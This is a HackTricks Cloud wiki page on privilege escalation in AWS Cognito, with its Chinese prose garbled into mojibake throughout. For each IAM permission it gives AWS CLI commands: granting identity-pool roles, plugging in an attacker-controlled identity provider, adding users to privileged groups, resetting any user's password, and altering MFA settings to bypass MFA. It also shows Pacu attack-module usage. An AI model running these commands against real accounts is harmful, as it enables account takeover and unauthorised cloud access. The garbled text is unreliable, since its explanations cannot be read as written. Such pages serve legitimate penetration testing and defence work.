# AWS - Cognito Privesc

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Cognito

æœ‰å…³ Cognito çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### ä»èº«ä»½æ± æ”¶é›†å‡­è¯

ç”±äº Cognito å¯ä»¥å‘ **å·²è®¤è¯** å’Œ **æœªè®¤è¯** **ç”¨æˆ·** æˆäºˆ **IAM è§’è‰²å‡­è¯**ï¼Œå¦‚æœæ‚¨æ‰¾åˆ°åº”ç”¨ç¨‹åºçš„ **èº«ä»½æ±  ID**ï¼ˆåº”è¯¥æ˜¯ç¡¬ç¼–ç åœ¨å…¶ä¸­ï¼‰ï¼Œæ‚¨å¯ä»¥è·å¾—æ–°çš„å‡­è¯ï¼Œä»è€Œå®ç°æƒé™æå‡ï¼ˆåœ¨æ‚¨å¯èƒ½ä¹‹å‰æ²¡æœ‰ä»»ä½•å‡­è¯çš„ AWS è´¦æˆ·å†…ï¼‰ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯· [**æŸ¥çœ‹æ­¤é¡µé¢**](../aws-unauthenticated-enum-access/#cognito)ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æƒé™æå‡åˆ°é™„åŠ ç»™æœªè®¤è¯ç”¨æˆ·çš„æœåŠ¡è§’è‰²ï¼ˆå¯èƒ½ä¹ŸåŒ…æ‹¬é™„åŠ ç»™å·²è®¤è¯ç”¨æˆ·çš„è§’è‰²ï¼‰ã€‚

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

é€šè¿‡æ­¤æƒé™ï¼Œæ‚¨å¯ä»¥ **æˆäºˆä»»ä½• Cognito è§’è‰²** ç»™ Cognito åº”ç”¨çš„å·²è®¤è¯/æœªè®¤è¯ç”¨æˆ·ã€‚
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374"
```
å¦‚æœ Cognito åº”ç”¨ **æ²¡æœ‰å¯ç”¨æœªè®¤è¯ç”¨æˆ·**ï¼Œæ‚¨å¯èƒ½è¿˜éœ€è¦æƒé™ `cognito-identity:UpdateIdentityPool` æ¥å¯ç”¨å®ƒã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°ä»»ä½• Cognito è§’è‰²ã€‚

### `cognito-identity:update-identity-pool`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥è®¾ç½®ä¸€ä¸ªä»–æ§åˆ¶çš„ Cognito ç”¨æˆ·æ± æˆ–ä»»ä½•å…¶ä»–èº«ä»½æä¾›è€…ï¼Œåœ¨é‚£é‡Œä»–å¯ä»¥ç™»å½• **ä»¥è®¿é—®æ­¤ Cognito èº«ä»½æ± **ã€‚ç„¶åï¼Œåªéœ€åœ¨è¯¥ç”¨æˆ·æä¾›è€…ä¸Š **ç™»å½•** å°±ä¼š **å…è®¸ä»–è®¿é—®èº«ä»½æ± ä¸­é…ç½®çš„è®¤è¯è§’è‰²**ã€‚
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
è¿™ä¹Ÿå¯ä»¥**æ»¥ç”¨æ­¤æƒé™ä»¥å…è®¸åŸºæœ¬èº«ä»½éªŒè¯**ï¼š
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**æ½œåœ¨å½±å“**ï¼šç ´åèº«ä»½æ± ä¸­é…ç½®çš„ç»è¿‡èº«ä»½éªŒè¯çš„ IAM è§’è‰²ã€‚

### `cognito-idp:AdminAddUserToGroup`

æ­¤æƒé™å…è®¸**å°† Cognito ç”¨æˆ·æ·»åŠ åˆ° Cognito ç»„**ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ­¤æƒé™å°†å…¶æ§åˆ¶ä¸‹çš„ç”¨æˆ·æ·»åŠ åˆ°å…·æœ‰**æ›´å¥½**æƒé™æˆ–**ä¸åŒ IAM è§’è‰²**çš„å…¶ä»–ç»„ä¸­ï¼š
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**æ½œåœ¨å½±å“ï¼š** æå‡æƒé™åˆ°å…¶ä»–Cognitoç»„å’Œé™„åŠ åˆ°ç”¨æˆ·æ± ç»„çš„IAMè§’è‰²ã€‚

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

æ‹¥æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»º/æ›´æ–°ç»„**ï¼Œå¹¶ä½¿ç”¨**è¢«æ”»é™·çš„Cognitoèº«ä»½æä¾›è€…å¯ä»¥ä½¿ç”¨çš„æ¯ä¸ªIAMè§’è‰²**ï¼Œä½¿è¢«æ”»é™·çš„ç”¨æˆ·æˆä¸ºè¯¥ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œè®¿é—®æ‰€æœ‰è¿™äº›è§’è‰²ï¼š

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ææƒåˆ°å…¶ä»–Cognito IAMè§’è‰²ã€‚

### `cognito-idp:AdminConfirmSignUp`

æ­¤æƒé™å…è®¸**éªŒè¯æ³¨å†Œ**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•äººéƒ½å¯ä»¥ç™»å½•Cognitoåº”ç”¨ç¨‹åºï¼Œå¦‚æœä¸åŠ ä»¥é™åˆ¶ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ä»»ä½•æ•°æ®åˆ›å»ºå¸æˆ·å¹¶é€šè¿‡æ­¤æƒé™è¿›è¡ŒéªŒè¯ã€‚
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**æ½œåœ¨å½±å“ï¼š** å¦‚æœæ‚¨å¯ä»¥æ³¨å†Œæ–°ç”¨æˆ·ï¼Œåˆ™å¯¹ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·çš„èº«ä»½æ±  IAM è§’è‰²çš„é—´æ¥æƒé™æå‡ã€‚èƒ½å¤Ÿç¡®è®¤ä»»ä½•å¸æˆ·ä¼šå¯¼è‡´å¯¹å…¶ä»–åº”ç”¨åŠŸèƒ½çš„é—´æ¥æƒé™æå‡ã€‚

### `cognito-idp:AdminCreateUser`

æ­¤æƒé™å°†å…è®¸æ”»å‡»è€…åœ¨ç”¨æˆ·æ± ä¸­åˆ›å»ºæ–°ç”¨æˆ·ã€‚æ–°ç”¨æˆ·è¢«åˆ›å»ºä¸ºå¯ç”¨çŠ¶æ€ï¼Œä½†éœ€è¦æ›´æ”¹å…¶å¯†ç ã€‚
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°èº«ä»½æ±  IAM è§’è‰²çš„è®¤è¯ç”¨æˆ·ã€‚é—´æ¥æå‡åˆ°å…¶ä»–åº”ç”¨åŠŸèƒ½ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·ã€‚

### `cognito-idp:AdminEnableUser`

æ­¤æƒé™å¯ä»¥åœ¨éå¸¸è¾¹ç¼˜çš„æƒ…å†µä¸‹æä¾›å¸®åŠ©ï¼Œæ”»å‡»è€…å‘ç°äº†ä¸€ä¸ªç¦ç”¨ç”¨æˆ·çš„å‡­è¯ï¼Œå¹¶ä¸”ä»–éœ€è¦**é‡æ–°å¯ç”¨å®ƒ**ã€‚
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**æ½œåœ¨å½±å“ï¼š** å¯¹äºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œé—´æ¥æå‡åˆ°èº«ä»½æ±  IAM è§’è‰²å’Œç”¨æˆ·æƒé™ï¼Œå¦‚æœæ”»å‡»è€…æ‹¥æœ‰ç¦ç”¨ç”¨æˆ·çš„å‡­æ®ã€‚

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

æ­¤æƒé™å…è®¸ä½¿ç”¨ [**æ–¹æ³• ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)** ç™»å½•ã€‚** æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®é“¾æ¥ã€‚

### `cognito-idp:AdminSetUserPassword`

æ­¤æƒé™å°†å…è®¸æ”»å‡»è€… **æ›´æ”¹ä»»ä½•ç”¨æˆ·çš„å¯†ç **ï¼Œä½¿å…¶èƒ½å¤Ÿå†’å……ä»»ä½•ç”¨æˆ·ï¼ˆä¸å¯ç”¨ MFA çš„ç”¨æˆ·ï¼‰ã€‚
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥çš„æƒé™æå‡ï¼Œå¯èƒ½å½±å“ä»»ä½•ç”¨æˆ·ï¼Œå› æ­¤å¯ä»¥è®¿é—®æ¯ä¸ªç”¨æˆ·æ‰€å±äºçš„æ‰€æœ‰ç»„ä»¥åŠè®¿é—®èº«ä»½æ± è®¤è¯çš„ IAM è§’è‰²ã€‚

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**ï¼šæ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨æ­¤æƒé™ï¼Œå°†å…¶æ§åˆ¶çš„æ‰‹æœºè®¾ç½®ä¸º **ç”¨æˆ·çš„ SMS MFA**ã€‚
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** ç±»ä¼¼äºå‰ä¸€ä¸ªæƒé™ï¼Œæ­¤æƒé™å¯ç”¨äºè®¾ç½®ç”¨æˆ·çš„ MFA åå¥½ï¼Œä»¥ç»•è¿‡ MFA ä¿æŠ¤ã€‚
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: ç±»ä¼¼äºå‰ä¸€ä¸ªæƒé™ï¼Œæ­¤æƒé™å¯ç”¨äºè®¾ç½®ç”¨æˆ·æ± çš„ MFA é¦–é€‰é¡¹ï¼Œä»¥ç»•è¿‡ MFA ä¿æŠ¤ã€‚
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** ä¹Ÿå¯ä»¥æ›´æ–°ç”¨æˆ·æ± ä»¥æ›´æ”¹ MFA ç­–ç•¥ã€‚ [åœ¨è¿™é‡ŒæŸ¥çœ‹ cli](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)ã€‚

**Potential Impact:** é—´æ¥çš„æƒé™æå‡ï¼Œå¯èƒ½é’ˆå¯¹æ”»å‡»è€…çŸ¥é“å‡­æ®çš„ä»»ä½•ç”¨æˆ·ï¼Œè¿™å¯èƒ½å…è®¸ç»•è¿‡ MFA ä¿æŠ¤ã€‚

### `cognito-idp:AdminUpdateUserAttributes`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥æ›´æ”¹å…¶æ§åˆ¶ä¸‹ç”¨æˆ·çš„ç”µå­é‚®ä»¶æˆ–ç”µè¯å·ç æˆ–ä»»ä½•å…¶ä»–å±æ€§ï¼Œä»¥å°è¯•åœ¨åŸºç¡€åº”ç”¨ç¨‹åºä¸­è·å¾—æ›´å¤šæƒé™ã€‚\
è¿™å…è®¸æ›´æ”¹ç”µå­é‚®ä»¶æˆ–ç”µè¯å·ç å¹¶å°†å…¶è®¾ç½®ä¸ºå·²éªŒè¯ã€‚
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**æ½œåœ¨å½±å“ï¼š** ä½¿ç”¨ Cognito ç”¨æˆ·æ± çš„åŸºç¡€åº”ç”¨ç¨‹åºä¸­å¯èƒ½å­˜åœ¨é—´æ¥çš„æƒé™æå‡ï¼ŒåŸºäºç”¨æˆ·å±æ€§æˆäºˆæƒé™ã€‚

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·æ± å®¢æˆ·ç«¯ï¼Œå…¶é™åˆ¶ä½äº**ç°æœ‰çš„æ± å®¢æˆ·ç«¯ã€‚ä¾‹å¦‚ï¼Œæ–°çš„å®¢æˆ·ç«¯å¯ä»¥å…è®¸ä»»ä½•ç±»å‹çš„æ–¹æ³•è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ²¡æœ‰ä»»ä½•ç§˜å¯†ï¼Œç¦ç”¨ä»¤ç‰Œæ’¤é”€ï¼Œå…è®¸ä»¤ç‰Œæœ‰æ•ˆæœŸæ›´é•¿...

å¦‚æœä¸æ˜¯åˆ›å»ºä¸€ä¸ªæ–°å®¢æˆ·ç«¯ï¼Œè€Œæ˜¯**ä¿®æ”¹ä¸€ä¸ªç°æœ‰çš„å®¢æˆ·ç«¯**ï¼Œä¹Ÿå¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚

åœ¨ [**å‘½ä»¤è¡Œ**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)ï¼ˆæˆ– [**æ›´æ–°å‘½ä»¤**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)ï¼‰ä¸­ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹æ‰€æœ‰é€‰é¡¹ï¼Œæ£€æŸ¥ä¸€ä¸‹ï¼
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**æ½œåœ¨å½±å“ï¼š** é€šè¿‡åˆ›å»ºä¸€ä¸ªæ”¾å®½å®‰å…¨æªæ–½çš„æ–°å®¢æˆ·ç«¯ï¼Œå¯èƒ½é—´æ¥æå‡å¯¹ç”¨æˆ·æ± ä½¿ç”¨çš„èº«ä»½æ± æˆæƒç”¨æˆ·çš„æƒé™ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿä½¿ç”¨ä»–èƒ½å¤Ÿåˆ›å»ºçš„ç”¨æˆ·ç™»å½•ã€‚

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æƒé™é€šè¿‡ä¸Šä¼ åŒ…å«æ–°ç”¨æˆ·çš„csvæ–‡ä»¶æ¥åˆ›å»ºç”¨æˆ·ã€‚
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
ï¼ˆåœ¨åˆ›å»ºæ–°çš„å¯¼å…¥ä½œä¸šçš„æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½è¿˜éœ€è¦ iam passrole æƒé™ï¼Œæˆ‘è¿˜æ²¡æœ‰æµ‹è¯•è¿‡ï¼‰ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·çš„èº«ä»½æ±  IAM è§’è‰²ã€‚é—´æ¥æå‡åˆ°å…¶ä»–åº”ç”¨åŠŸèƒ½ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·ã€‚

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„èº«ä»½æä¾›è€…ï¼Œä»è€Œèƒ½å¤Ÿé€šè¿‡è¯¥æä¾›è€…**ç™»å½•**ã€‚
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡åˆ°èº«ä»½æ±  IAM è§’è‰²çš„è®¤è¯ç”¨æˆ·ã€‚é—´æ¥æå‡åˆ°å…¶ä»–åº”ç”¨åŠŸèƒ½ï¼Œèƒ½å¤Ÿåˆ›å»ºä»»ä½•ç”¨æˆ·ã€‚

### cognito-sync:\* åˆ†æ

è¿™æ˜¯ Cognito èº«ä»½æ± è§’è‰²ä¸­é»˜è®¤éå¸¸å¸¸è§çš„æƒé™ã€‚å³ä½¿æƒé™ä¸­çš„é€šé…ç¬¦çœ‹èµ·æ¥æ€»æ˜¯ä¸å¥½ï¼ˆç‰¹åˆ«æ˜¯æ¥è‡ª AWSï¼‰ï¼Œ**ç»™å®šçš„æƒé™ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹å¹¶ä¸æ˜¯ç‰¹åˆ«æœ‰ç”¨**ã€‚

æ­¤æƒé™å…è®¸è¯»å–èº«ä»½æ± ä¸­çš„ç”¨æˆ·ä¿¡æ¯å’Œèº«ä»½ IDï¼ˆè¿™ä¸æ˜¯æ•æ„Ÿä¿¡æ¯ï¼‰ã€‚\
èº«ä»½ ID å¯èƒ½æœ‰ [**æ•°æ®é›†**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) åˆ†é…ç»™å®ƒä»¬ï¼Œè¿™äº›æ˜¯ä¼šè¯çš„ä¿¡æ¯ï¼ˆAWS å°†å…¶å®šä¹‰ä¸º **ä¿å­˜çš„æ¸¸æˆ**ï¼‰ã€‚è¿™å¯èƒ½åŒ…å«æŸç§æ•æ„Ÿä¿¡æ¯ï¼ˆä½†æ¦‚ç‡ç›¸å½“ä½ï¼‰ã€‚æ‚¨å¯ä»¥åœ¨ [**æšä¸¾é¡µé¢**](../aws-services/aws-cognito-enum/) æ‰¾åˆ°å¦‚ä½•è®¿é—®è¿™äº›ä¿¡æ¯ã€‚

æ”»å‡»è€…è¿˜å¯ä»¥ä½¿ç”¨è¿™äº›æƒé™æ¥ **æ³¨å†Œè‡ªå·±åˆ°ä¸€ä¸ª Cognito æµï¼Œå‘å¸ƒè¿™äº›æ•°æ®é›†çš„æ›´æ”¹** æˆ– **åœ¨ Cognito äº‹ä»¶ä¸Šè§¦å‘çš„ lambda**ã€‚æˆ‘æ²¡æœ‰è§è¿‡è¿™ç§ç”¨æ³•ï¼Œæˆ‘ä¹Ÿä¸æœŸæœ›è¿™é‡Œæœ‰æ•æ„Ÿä¿¡æ¯ï¼Œä½†è¿™å¹¶ä¸æ˜¯ä¸å¯èƒ½çš„ã€‚

### è‡ªåŠ¨åŒ–å·¥å…·

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)ï¼ŒAWS åˆ©ç”¨æ¡†æ¶ï¼Œç°åœ¨åŒ…æ‹¬ "cognito\_\_enum" å’Œ "cognito\_\_attack" æ¨¡å—ï¼Œè‡ªåŠ¨æšä¸¾è´¦æˆ·ä¸­çš„æ‰€æœ‰ Cognito èµ„äº§å¹¶æ ‡è®°å¼±é…ç½®ã€ç”¨äºè®¿é—®æ§åˆ¶çš„ç”¨æˆ·å±æ€§ç­‰ï¼ŒåŒæ—¶è¿˜è‡ªåŠ¨åˆ›å»ºç”¨æˆ·ï¼ˆåŒ…æ‹¬ MFA æ”¯æŒï¼‰å’ŒåŸºäºå¯ä¿®æ”¹è‡ªå®šä¹‰å±æ€§ã€å¯ç”¨èº«ä»½æ± å‡­è¯ã€å¯å‡è®¾è§’è‰²çš„ ID ä»¤ç‰Œç­‰çš„æƒé™æå‡ã€‚

æœ‰å…³æ¨¡å—åŠŸèƒ½çš„æè¿°ï¼Œè¯·å‚è§ [åšå®¢æ–‡ç« ](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) çš„ç¬¬ 2 éƒ¨åˆ†ã€‚æœ‰å…³å®‰è£…è¯´æ˜ï¼Œè¯·å‚è§ä¸» [Pacu](https://github.com/RhinoSecurityLabs/pacu) é¡µé¢ã€‚

#### ç”¨æ³•

ç¤ºä¾‹ cognito\_\_attack ç”¨æ³•ï¼Œå°è¯•ç”¨æˆ·åˆ›å»ºå’Œé’ˆå¯¹ç»™å®šèº«ä»½æ± å’Œç”¨æˆ·æ± å®¢æˆ·ç«¯çš„æ‰€æœ‰æƒé™æå‡å‘é‡ï¼š
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
ç¤ºä¾‹ cognito\_\_enum ç”¨æ³•ï¼Œä»¥æ”¶é›†å½“å‰ AWS è´¦æˆ·ä¸­å¯è§çš„æ‰€æœ‰ç”¨æˆ·æ± ã€ç”¨æˆ·æ± å®¢æˆ·ç«¯ã€èº«ä»½æ± ã€ç”¨æˆ·ç­‰ï¼š
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) æ˜¯ä¸€ä¸ªç”¨ Python ç¼–å†™çš„ CLI å·¥å…·ï¼Œå®æ–½å¯¹ Cognito çš„ä¸åŒæ”»å‡»ï¼ŒåŒ…æ‹¬æƒé™æå‡ã€‚

#### å®‰è£…
```bash
$ pip install cognito-scanner
```
#### ç”¨æ³•
```bash
$ cognito-scanner --help
```
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
